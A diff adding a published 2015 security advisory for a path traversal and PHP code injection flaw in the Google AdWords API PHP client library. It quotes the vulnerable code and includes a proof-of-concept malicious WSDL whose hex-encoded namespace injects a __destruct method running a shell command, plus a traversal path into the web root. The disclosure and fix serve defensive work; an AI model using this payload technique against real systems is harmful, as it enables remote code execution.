@@ -1,0 +1,335 @@
+# Date: 06.11.2015
+# Title: Google AdWords API PHP client library <= 6.2.0 Arbitrary PHP Code Execution
+# Exploit Author: Dawid Golunski
+# Vendor Homepage: https://developers.google.com/adwords/api/docs/clientlibraries
+# Software Link: https://github.com/googleads/googleads-php-lib
+# Version: <=6.2.0
+
+
+=============================================
+- Release date: 06.11.2015
+- Discovered by: Dawid Golunski
+- Severity: Medium/High
+=============================================
+
+ 
+I. VULNERABILITY
+-------------------------
+
+Google AdWords API PHP client library <= 6.2.0    Arbitrary PHP Code Execution
+(googleads-php-lib)
+ 
+II. BACKGROUND
+-------------------------
+
+- AdWords API
+
+https://developers.google.com/adwords/api/docs/
+
+"The AdWords API is a collection of web services that you can use to build 
+applications that manage AdWords accounts and their associated campaign data.
+While the AdWords API is based on SOAP 1.1, high-level client libraries are 
+provided to help you develop applications more quickly."
+
+AdWords API client libraries are available for different platforms
+such as PHP, .NET, Java etc. 
+These can be found at:
+
+https://developers.google.com/adwords/api/docs/clientlibraries
+ 
+III. INTRODUCTION
+-------------------------
+
+The Google AdWords API client library for PHP contains a WSDL Interpreter
+class which is described in a comment within the source code as:
+
+"
+* The main class for handling WSDL interpretation.
+ *
+ * The WSDLInterpreter is utilized for the parsing of a WSDL document for rapid
+ * and flexible use within the context of PHP 5 scripts.
+"
+
+The class contains a function savePHP() which allows to convert the WSDL 
+document received from a remote end into a PHP file. 
+The funcion is vulnerable to Path Traversal and Code Execution vulnerabilities.
+
+IV. DESCRIPTION
+-------------------------
+ 
+googleads-php-lib contains the following function which is meant to load WSDL 
+document (XML data) from a remote Google AdWords server:
+
+---[ build_lib/WSDLInterpreter/WSDLInterpreter.php ]---
+
+  protected function loadWsdl($wsdlUri, $proxy = null) {
+    // Set proxy.
+    if ($proxy) {
+      $opts = array(
+          'http' => array(
+              'proxy' => $proxy,
+              'request_fulluri' => true
+          )
+      );
+      $context = stream_context_get_default($opts);
+      libxml_set_streams_context($context);
+    }
+
+    $this->dom = new DOMDocument();
+    $this->dom->load($wsdlUri,
+        LIBXML_DTDLOAD|LIBXML_DTDATTR|LIBXML_NOENT|LIBXML_XINCLUDE);
+
+-------------------------------------------------------
+
+For security reasons Google AdWords API should only be accessed via HTTPS. 
+However, the above code does not set appropriate SSL settings on the 
+https:// stream context. 
+It fails to assign Certificate Authority (CA), turn the verify_peer 
+option to ON, specify allowed ciphers etc.
+It uses the stream_context_get_default() function to get the default context,
+which on all PHP versions below PHP 5.6.x (see references), does not validate 
+the CA by default. 
+Because of this, application may retrieve data from untrusted sources 
+pretending to be adwords.google.com.
+
+Further on, the WSDLInterpreter class contains the following savePHP function:
+
+---[ build_lib/WSDLInterpreter/WSDLInterpreter.php ]---
+
+  /**
+   * Saves the PHP source code that has been loaded to a target directory.
+   *
+   * Services will be saved by their validated name, and classes will be
+   * included with each service file so that they can be utilized independently.
+   *
+   * @param string $outputDirectory the destination directory for the source
+   *    code
+   * @return array array of source code files that were written out
+   * @throws WSDLInterpreterException problem in writing out service sources
+   */
+  public function savePHP($outputDirectory) {
+    if (!count($this->servicePHPSources)) {
+      throw new WSDLInterpreterException("No services loaded");
+    }
+    $namespace = $this->enableNamespaces ? sprintf("namespace %s;\n\n",
+        $this->utils->getNamespace()) : '';
+    $require = sprintf("require_once \"%s\";\n\n", $this->soapClientClassPath);
+    $classSource = join("\n\n", $this->classPHPSources);
+    $outputFiles = 
+    foreach ($this->servicePHPSources as $serviceName => $serviceCode) {
+      $filename = sprintf('%s/%s.php', $outputDirectory, $serviceName);
+      $success = file_put_contents($filename, sprintf(
+          "<?php\n%s%s%s%s\n\n%s\n\n", $this->getFileHeader(), $namespace,
+              $require, $classSource, $serviceCode));
+...
+
+-------------------------------------------------------
+
+The function does not perform sufficient sanitisation of the WSDL document
+received from a remote end. It allows to inject '../' sequence, which can be
+used by attackers to  save the resulting translated PHP file into an arbitrary
+directory on the system.
+It also fails to validate the Name spaces provided within WSDL XML document,
+making it possible to inject arbitrary PHP code via encoding it in hex.
+
+For the attack to be successful, the attacker needs to perform a MitM attack 
+to impersonate adwords.google.com server (eg. via DNS poisoning/spoofing/proxy
+attacks, ARP spoofing, etc. ) to inject malicious XML code.
+ 
+
+V. PROOF OF CONCEPT
+-------------------------
+ 
+Below is a test application that makes use of of PHP Google AdWords API library.
+The application simply connects to the AdWords API endpoint to retrieve the 
+Google API WSDL document and translates it into a PHP file.
+
+---[ testAPI.php ]---
+
+<?php
+// Test application reading WSDL from Google AdWords 
+
+set_include_path('./build_lib/WSDLInterpreter/');
+require_once 'WSDLInterpreter.php';
+
+$wsdlUri = 'https://adwords.google.com/api/adwords/cm/v201502/'
+	  .'CampaignService?wsdl';
+
+$wsdlInterpreter = new WSDLInterpreter($wsdlUri, "AdWordsSoapClient",null, 
+null, "CampaignService", "v201502", "Ads_Google", 
+"./src/Google/Api/Ads/AdWords/Lib/AdWordsSoapClient.php", null, true, null);
+
+$wsdlInterpreter->savePHP('/tmp/');
+
+?>
+
+---------------------
+
+
+To exploit this application, an attacker needs to perform a MitM attack
+to impersonate adwords.google.com server as mentioned in the description above.
+
+If an attacker manages to inject the XML below, when the victim requests
+the https://adwords.google.com/api/adwords/cm/v201502/CampaignService?wsdl link
+from Google AdWords endpoint:
+
+---[ malicious XML ]---
+
+<?xml version="1.0" encoding="UTF-8"?>
+<definitions xmlns:typens="urn:POC_RCE" 
+    xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
+    xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
+    xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" 
+    xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" 
+    xmlns="http://schemas.xmlsoap.org/wsdl/"
+    name="POCexploit" targetNamespace="urn:POCexploit444"&#x3b;&#x20;&#x70;&#x75;&#x62;&#x6c;&#x69;&#x63;&#x20;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x5f;&#x5f;&#x64;&#x65;&#x73;&#x74;&#x72;&#x75;&#x63;&#x74;&#x28;&#x29;&#x20;&#x7b;&#x20;&#x24;&#x65;&#x78;&#x66;&#x6f;&#x6f;&#x20;&#x3d;&#x20;&#x60;&#x2f;&#x62;&#x69;&#x6e;&#x2f;&#x74;&#x6f;&#x75;&#x63;&#x68;&#x20;&#x2f;&#x74;&#x6d;&#x70;&#x2f;&#x61;&#x64;&#x77;&#x6f;&#x72;&#x64;&#x73;&#x5f;&#x61;&#x70;&#x69;&#x5f;&#x68;&#x61;&#x63;&#x6b;&#x65;&#x64;&#x60;&#x3b;&#x20;&#x7d;&#x20;&#x63;&#x6f;&#x6e;&#x73;&#x74;&#x20;&#x4e;&#x4f;&#x54;&#x48;&#x49;&#x4e;&#x47;&#x20;&#x3d;&#x20;"">
+    <service name="../../../var/www/html/POC_Exploit">
+        <port name="Some_HandlerPort" binding="typens:Some_HandlerBinding">
+            <soap:address location="https://adwords.google.com/api/adwords/cm/v201502/CampaignService?wsdl" />
+        </port>
+    </service>
+</definitions>
+
+----------------------
+
+the vulnerable application will translate it and save it as a script in 
+/var/www/html/POC_Exploit.php (assuming directory is writable) location,
+instead of /tmp location, due the Path Traversal in '<service name=' tag.
+
+It will also decode the hex values representing a malicious PHP script to:
+
+"; public function __destruct() { $exfoo = `/bin/touch /tmp/adwords_api_hacked`; }
+ const NOTHING = "
+
+The resulting file will be saved in /var/www/html/POC_Exploit.php , and will
+look as follows after the WSDL to PHP translation:
+
+
+---[ resulting POC_Exploit.php file ]---
+
+<?php
+/**
+[cut]
+ * @package    Ads_Google
+ * @subpackage v201309
+ * @category   WebServices
+ * @copyright  2014, Google Inc. All Rights Reserved.
+ * @license    http://www.apache.org/licenses/LICENSE-2.0 Apache License,
+ *             Version 2.0
+ */
+namespace Ads_Google;
+
+require_once "../../src/Google/Api/Ads/AdWords/Lib/AdWordsSoapClient.php";
+
+if (!class_exists("VarwwwhtmlPOC_Exploit", false)) {
+  /**
+   * VarwwwhtmlPOC_Exploit
+   * @package Ads_Google
+   * @subpackage v201309
+   */
+  class VarwwwhtmlPOC_Exploit extends AdWordsSoapClient {
+
+    const SERVICE_NAME = "../../../var/www/html/POC_Exploit";
+    const WSDL_NAMESPACE = "urn:POCexploit444"; public function __destruct() { $exfoo = `/bin/touch /tmp/adwords_api_hacked`; } const NOTHING = "";
+    const ENDPOINT = "https://adwords.google.com/api/adwords/cm/v201502/CampaignService?wsdl";
+
+    /**
+     * The endpoint of the service
+     * @var string
+     */
+    public static $endpoint = "https://adwords.google.com/api/adwords/cm/v201502/CampaignService?wsdl";
+
+    /**
+     * Constructor using wsdl location and options array
+     * @param string $wsdl WSDL location for this service
+     * @param array $options Options for the SoapClient
+     */
+    public function __construct($wsdl, $options, $user) {
+      $options["classmap"] = self::$classmap;
+      parent::__construct($wsdl, $options, $user, self::SERVICE_NAME,
+          self::WSDL_NAMESPACE);
+    }
+  }
+}
+
+----------------------------------------
+
+If such class gets included it will execute the malicious code due to the 
+injected __destruct() method, which creates /tmp/adwrods_api_hacked file.
+
+At this point the attacker can control the name of the class (through service name), 
+the path to the resulting PHP file, and is also able to inject any PHP code.
+
+Going further, He could also close the class definition statement and write an arbitrary 
+PHP code in the main file. 
+This would allow the attacker to create a stand alone script which he 
+could request remotely via the Web server if he managed save it within the web
+root.  
+In this way the attacker could create a stand alone PHP command shell and get
+access to the system.
+
+
+VI. BUSINESS IMPACT
+-------------------------
+
+The severity of this issue is lowered to medium/high as despite the possibility
+to execute arbitrary code, the attacker must impersonate adwords.google.com
+server to be able to inject malicious XML. 
+If there is a possibility for such an attack, the severity of the issue
+can grow to high/critical.
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+Google AdWords API PHP client library in versions up to 6.2.0 contain the 
+vulnerable WSDLInterpreter code.
+ 
+VIII. SOLUTION
+-------------------------
+
+Upgrade Google AdWords API PHP client library to the latest version.
+ 
+IX. REFERENCES
+-------------------------
+
+This advisory:
+
+http://legalhackers.com/advisories/Google-AdWords-PHP-Client-library-PHP-Code-Execution.txt
+
+Related, Google AdWords API client libraries - XML eXternal Entity Injection (XXE) vuln:
+http://legalhackers.com/advisories/Google-AdWords-API-libraries-XXE-Injection-Vulnerability.txt
+
+https://github.com/googleads/googleads-php-lib
+
+https://github.com/googleads/googleads-php-lib/blob/master/ChangeLog.md
+
+https://developers.google.com/adwords/api/docs/
+
+https://developers.google.com/adwords/api/docs/clientlibraries
+
+PHP 5.6.x openssl certificates in PHP streams:
+http://php.net/manual/en/migration56.openssl.php
+
+X. CREDITS
+-------------------------
+
+The vulnerability has been discovered by Dawid Golunski
+dawid (at) legalhackers (dot) com
+
+http://legalhackers.com
+ 
+XI. REVISION HISTORY
+-------------------------
+
+May 18th, 2015:  Advisory created and sent to Google Security Team
+
+Nov 5th,  2015:  Google, after half a year, confirm the vulnerability has been patched
+
+Nov 6th,  2015:  Advisory released publicly
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
